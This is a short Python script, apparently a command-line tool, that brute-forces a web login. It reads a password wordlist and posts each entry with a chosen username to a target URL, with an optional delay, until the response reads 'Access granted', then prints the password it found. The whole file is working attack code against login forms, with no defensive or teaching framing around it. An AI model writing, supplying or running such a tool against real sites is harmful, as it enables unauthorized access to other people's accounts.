import requests
import argparse
import time

parser = argparse.ArgumentParser()

def load_wordlist(path):
    password = []
    with open(path, "r") as f:
        for line in f:
            password.append(line.strip())
    return password

def main():
    parser.add_argument("--url")
    parser.add_argument("--wordlist")
    parser.add_argument("--username")
    parser.add_argument("--delay", type=float, default=0)
    args = parser.parse_args()

    result = load_wordlist(args.wordlist)

    for i in result:
        response = requests.post(args.url, data={"username": args.username, "password": i})
        time.sleep(args.delay)
        if response.text == "Access granted":
            print(f"Password found: {i}")
            break
    else:
        print("Password not found in wordlist!")

if __name__ == "__main__":
    main()